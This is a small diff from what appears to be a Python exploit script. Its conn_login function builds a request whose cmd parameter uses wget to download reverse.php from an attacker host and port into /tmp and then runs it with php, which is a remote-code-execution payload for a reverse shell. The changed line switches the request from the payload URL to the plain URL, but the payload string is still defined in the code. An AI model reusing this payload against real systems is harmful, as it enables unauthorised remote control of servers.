@@ -27,7 +27,7 @@ def banner():
 def conn_login():
         url_req = '{a}&cmd=wget%20http://{b}:{c}/reverse.php%20-O%20/tmp/reverse.php;php%20/tmp/reverse.php'.format(a=url, b=ip, c=port_server)
         #REDIRECT_URL_LOGIN
-        redirect = requests.get(url_req)
+        redirect = requests.get(url)
         redirect_url = (redirect.url)
         #EXTRACT_IP
         extract = urlparse(url)
